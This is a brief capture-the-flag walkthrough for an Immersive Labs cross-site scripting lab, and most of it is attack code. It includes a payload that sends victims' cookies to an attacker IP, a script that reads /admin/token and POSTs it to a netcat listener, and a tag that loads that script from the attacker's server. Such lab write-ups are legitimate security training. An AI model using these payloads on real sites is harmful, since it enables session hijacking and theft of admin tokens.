---
date: 2025-04-27
categories: [CTF, ImmersiveLabs]
title: "IML - Cross-Site Scripting: Ep.6 – Further Exploitation"
tags: ['privilege escalation', 'python', 'rce', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Cross-Site Scripting Ep.6 – F - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Cross-Site Scripting: Ep.6 – Further Exploitation


![image1](../resources/81e9facdcd524216bd9db80ea0e500c3.png)

```java
<script>document.location="http://10.102.179.231:8000/?cookie="+document.cookie;</script>
```

![image2](../resources/3e99d7ccbbe9401894e1e7828e79bdfa.png)

- **<u>Token and username received</u>**


![image3](../resources/c892c30a412a46f3948a7fcd73b39bc4.png)

- Create script (script.js)


![image4](../resources/014019cde821452b93fe0722e5ff82f9.png)

```javascript
var sensitive_data = new XMLHttpRequest();
sensitive_data.open("GET", "/admin/token", true);
sensitive_data.responseType = "text";

sensitive_data.onload = () => {
    if (sensitive_data.status >= 200 && sensitive_data.status < 400) {
        var body = sensitive_data.responseText;
        var send_data = new XMLHttpRequest();
        send_data.open("POST", "http://<IP>:<KALI_NC_PORT>", true);
        send_data.send("page_body=" + body);
    } else {
        // do nothing
    }
};

sensitive_data.send();

```


- Change IP and Port

- Run Python server in same dir as script


![image5](../resources/523d0853f9204c1ba8a55cdd0cdfba1f.png)

- Set up nc listener on port specified in script


![image6](../resources/6b72b2076e2340fd8b4c74640bacaccd.png)

- Send email with the src tag (kali IP and the Port of the python server)


![image7](../resources/0f50e13dc0e248338bfe7cca969c95b5.png)

```javascript
<script src="http://<kali IP>:<kali port>/script.js"></script>
```

- *Sometimes need to reset the machine on this one cus it doesn’t work first time*


![image8](../resources/87e5d6bb27ac4008ab946805aca5235a.png)
